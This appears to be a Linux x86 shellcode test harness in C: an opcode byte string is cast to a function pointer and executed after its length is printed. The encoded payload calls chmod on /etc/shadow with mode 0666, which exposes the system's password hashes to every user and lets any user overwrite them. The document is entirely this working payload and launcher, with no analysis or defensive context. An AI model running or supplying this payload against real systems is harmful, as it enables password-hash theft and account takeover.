#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x1e\x2c\x0f\x99\x52\x6a\x77\x66\x68\x64\x6f\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xb6\x01\x59\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
